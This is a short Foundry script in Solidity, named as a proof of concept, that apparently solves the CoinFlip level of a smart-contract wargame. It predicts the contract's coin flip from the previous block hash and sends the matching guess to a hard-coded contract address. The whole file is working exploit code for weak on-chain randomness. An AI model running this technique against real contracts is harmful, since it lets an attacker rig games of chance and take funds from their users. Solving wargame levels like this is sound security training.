// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/coinflip.sol";

contract POC is Script {
   

    CoinFlip level3 = CoinFlip(0x70c247b66df0532D53Ed5e6f21f5F53013B1eBb8);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }
            
        console.log("Consecutive Wins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }
}